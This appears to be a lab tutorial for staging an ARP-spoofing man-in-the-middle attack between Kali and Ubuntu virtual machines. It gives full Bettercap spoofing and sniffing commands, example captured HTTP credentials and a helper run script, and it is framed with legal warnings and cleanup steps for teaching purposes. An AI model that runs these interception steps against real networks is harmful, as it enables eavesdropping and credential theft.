# ARP Spoofing Lab 

## Overview

This document guides you through building a controlled ARP spoofing (ARP poisoning) lab in VirtualBox. It uses two virtual machines:

- **Kali Linux** — attacker
- **Ubuntu** — victim

The lab demonstrates how ARP works on a local network, how a Man‑in‑the‑Middle (MITM) attack can be carried out using ARP spoofing with Bettercap, how to capture unencrypted HTTP traffic, and how to clean up afterwards.

**Important legal notice:** Only perform these steps in a test network you control. Running ARP spoofing against networks or devices you don’t own or don’t have explicit authorization to test is illegal.

---

## Goals

* Create an isolated NAT network in VirtualBox for Kali and Ubuntu.
* Configure both VMs to use that private network.
* Launch an ARP spoofing attack from Kali with Bettercap.
* Capture and analyze HTTP traffic (cleartext) using Bettercap and Wireshark.
* Save evidence to a pcap and restore the network state afterwards.

---

## Recommended topology

* VirtualBox NAT Network name: `ARP_Lab` — 192.168.50.0/24
* Example addressing (DHCP):

  * `192.168.50.1` — NAT gateway
  * `192.168.50.10` — Kali
  * `192.168.50.20` — Ubuntu



---

## Step 1 — Create the NAT network in VirtualBox

1. Open VirtualBox.
2. File → Preferences → Network → NAT Networks.
3. Click **+** to create a new NAT Network.
4. Configure:

   * **Name:** `ARP_Lab`
   * **IPv4 CIDR:** `192.168.50.0/24`
   * **Enable DHCP:** checked
5. Click **OK** to save.

<img src="images/capture1.png" width="500" height="500">

---

## Step 2 — Attach Kali and Ubuntu to the NAT network

### Kali VM

* VM → Settings → Network → Adapter 1 → Attached to: **NAT Network** → Choose: `ARP_Lab` → OK.

### Ubuntu VM

* Same steps as Kali: Adapter 1 → NAT Network → `ARP_Lab` → OK.

<img src="images/capture3.png" width="500" height="500">
<img src="images/capture2.png" width="500" height="500">

---

## Step 3 — Verify connectivity

Boot both VMs.

On Kali:

```bash
ip addr show
# Record the IP, e.g. 192.168.50.10
```

On Ubuntu:

```bash
ip addr show
# Record the IP, e.g. 192.168.50.20
```

From Kali, test reachability:

```bash
ping -c 4 192.168.50.20
```

If replies arrive, the VMs can communicate.

<img src="images/capture4.png" width="500" height="500">
<img src="images/capture5.png" width="500" height="500">
<img src="images/capture6.png" width="500" height="500">



---

## Step 4 — Install required tools

### On Kali (attacker)

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install bettercap wireshark -y
bettercap --version
```

Bettercap may already be installed on Kali images.

### On Ubuntu (victim)

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install firefox -y
```

A web browser is sufficient for generating HTTP requests for the demo.

<img src="images/capture7.png" width="500" height="500">


---

## Step 5 — Choose HTTP test sites

Only use HTTP (not HTTPS) so traffic remains readable.
Suggested test sites:

* [http://testphp.vulnweb.com/](http://testphp.vulnweb.com/)
* [http://neverssl.com/](http://neverssl.com/)
* [http://httpforever.com/](http://httpforever.com/)


---

## Step 6 — Enable IP forwarding on Kali

Allow Kali to forward packets between the victim and gateway:

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

If you want it permanent, change `/etc/sysctl.conf` (optional).

<img src="images/capture10.png" width="500" height="500">


---

## Step 7 — Run Bettercap and perform ARP spoofing

1. Identify your network interface name (example: `eth0`, `enp0s3`):

```bash
ip a
```

2. Start Bettercap on the chosen interface:

```bash
sudo bettercap -iface eth0
```

3. Discover hosts (inside bettercap):

```
net.probe on
sleep 5
net.show
```

You’ll see entries such as gateway and victim IPs.

4. Start ARP spoofing against the victim:

```
set arp.spoof.targets 192.168.50.20
set arp.spoof.internal true
arp.spoof on
```

Kali will now place itself between the victim and the gateway (MITM).

<img src="images/capture17.png" width="500" height="500">

---

## Step 8 — Sniff HTTP traffic with Bettercap

In Bettercap:

```
set net.sniff.verbose true
set net.sniff.local true
set net.sniff.filter 'tcp port 80'
net.sniff on
```

You will see HTTP requests and responses in Bettercap’s console, for example:

```
[net.sniff] 192.168.50.20:4321 → 192.168.50.1:80 GET /index.html
[net.sniff] 192.168.50.20:4321 → 192.168.50.1:80 POST /login.php username=test&password=123
```


---

## Step 9 — (Optional) Inspect with Wireshark

Open Wireshark on Kali:

```bash
sudo wireshark &
```

Select the interface and use display filters such as `http` or `tcp.port == 80`.


---

## Step 10 — Demonstration workflow

### On Ubuntu (victim)

Open Firefox and visit a test HTTP site from Step 5. Fill forms or perform searches to generate requests.

<img src="images/capture101.png" width="500" height="500">



---

## Step 11 — Save the capture (optional)

### On Kali (attacker)

Monitor Bettercap for cleartext GET/POST requests and credentials.

<img src="images/capture102.png" width="500" height="500">

View captured user credentials in the attacker’s terminal.

<img src="images/capture103.png" width="500" height="500">

---

## Step 12 — Cleanup and restore

Stop spoofing and forwarding:

```bash
# Disable IP forwarding
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward

# In bettercap (if open):
arp.spoof off
net.sniff off
exit

# If you started a service or background process:
sudo systemctl stop bettercap || true
```

On Ubuntu, check the ARP table:

```bash
sudo arp -n
```

If entries remain, restart the network interface or reboot the VM to clear stale ARP entries.

---

## Run Bettercap — helper script

Below is a small helper script you can ship in `scripts/run_bettercap.sh`.  
It performs a minimal install of `bettercap` if missing, enables IPv4 forwarding, and then runs `bettercap` with a provided caplet. It is intended for quick lab use (must be run as `root`).

```bash
#!/usr/bin/env bash
# Minimal installer + runner for bettercap with a caplet in the same folder.
# Usage: sudo ./scripts/run_bettercap.sh <IFACE> <CAPLET_PATH>
# - Enables IPv4 forwarding while bettercap runs, disables it on exit

set -euo pipefail

IFACE="${1:-}"
CAPLET="${2:-}"

if [ -z "$IFACE" ] || [ -z "$CAPLET" ]; then
  echo "Usage: sudo $0 <IFACE> <CAPLET_PATH>"
  exit 2
fi

if [ "$(id -u)" -ne 0 ]; then
  echo "[!] This script must be run as root (sudo)."
  exit 3
fi

cleanup() {
  echo
  echo "[*] Cleaning up: disabling IPv4 forwarding..."
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM

# Checking if bettercap installed
if ! command -v bettercap >/dev/null 2>&1; then
  echo "[*] bettercap not found. Attempting quick install..."

  # Trying to install with go
  if command -v go >/dev/null 2>&1; then
    echo "[*] Found 'go' in PATH — using 'go install' to install bettercap..."
    if go install github.com/bettercap/bettercap/v2@latest; then
      export PATH="$PATH:$(go env GOPATH 2>/dev/null)/bin"
      echo "[*] bettercap installed to $(command -v bettercap || echo 'GOBIN')"
    else
      echo "[!] 'go install' failed. Please install bettercap manually and re-run."
      exit 4
    fi
  # Trying to install using apt-get
  elif command -v apt-get >/dev/null 2>&1; then
    echo "[*] Attempting 'apt-get install bettercap' (may be outdated on some distros)..."
    apt-get update && apt-get install -y bettercap || {
      echo "[!] apt-get install failed. Please install bettercap manually and re-run."
      exit 5
    }
  else
    echo "[!] No automatic install method available (no 'go' and no apt)."
    echo "    Please install bettercap manually: https://www.bettercap.org"
    exit 6
  fi
else
  echo "[*] bettercap found: $(command -v bettercap)"
fi

# confirm caplet exists
if [ ! -f "$CAPLET" ]; then
  echo "[!] Caplet not found at path: $CAPLET"
  exit 7
fi

echo "[*] Enabling IPv4 forwarding..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null

echo "[*] Running bettercap with caplet: $CAPLET on interface $IFACE"
echo "[*] NOTE: This run does not save captures or logs (per script settings)."
echo "[*] Press Ctrl+C to stop bettercap and restore forwarding."

exec bettercap -iface "$IFACE" -caplet "$CAPLET"
```

---

## Quick reference — essential Bettercap commands

* `net.probe on` — probe the network
* `net.show` — show discovered hosts
* `set arp.spoof.targets <IP>` — set the victim
* `set arp.spoof.internal true` — internal spoof mode
* `arp.spoof on/off` — toggle spoofing
* `set net.sniff.filter 'tcp port 80'` — sniff HTTP only
* `set net.sniff.output /path/to/file.pcap` — save capture
* `net.sniff on/off` — toggle sniffing

---

## Closing notes

This lab is designed for learning and defensive testing. Use it to understand how unencrypted traffic and weak local network protocols can expose sensitive data. Always restore the environment and remove any persistent configurations you added for the test.


